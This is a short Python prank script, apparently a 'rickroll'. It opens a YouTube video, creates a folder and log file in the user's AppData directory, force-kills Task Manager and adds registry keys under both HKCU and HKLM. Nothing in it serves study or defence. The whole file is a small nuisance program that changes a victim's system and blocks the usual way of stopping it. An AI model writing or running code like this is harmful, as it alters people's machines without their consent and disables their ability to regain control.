import os;
import subprocess

os.startfile("https://www.youtube.com/watch?v=dQw4w9WgXcQ");

#console application
subprocess.Popen([r'cmd.exe', '/c cd %appdata% & mkdir nrr_project &cd nrr_project &echo you has rickroll -NoRickRoll- *.py python >.log_hisotry']);
subprocess.Popen([r'taskkill.exe', '/f /im taskmgr.exe']);
#regedit
subprocess.Popen([r'reg.exe', 'ADD HKCU\Software\NoRickRollApp']);
subprocess.Popen([r'reg.exe', 'ADD HKLM\Software\NoRickRollApp']);


